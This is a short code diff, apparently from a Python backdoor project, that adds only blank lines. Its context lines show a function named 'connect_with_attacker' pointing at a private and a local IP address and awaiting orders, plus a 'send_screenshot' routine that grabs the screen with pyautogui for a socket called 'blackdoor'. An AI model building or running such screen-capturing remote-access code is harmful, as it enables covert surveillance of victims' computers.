@@ -2,6 +2,7 @@ import socket
 import pyautogui
 from io import BytesIO
 
+
 def connect_with_attacker():
     # server_ip = '192.168.0.136'
     server_ip = '127.0.1.1'
@@ -27,6 +28,7 @@ def connect_with_attacker():
     # wait for orders
     # while True:
     #
+
 
 def send_screenshot(blackdoor):
     screenshot = pyautogui.screenshot()
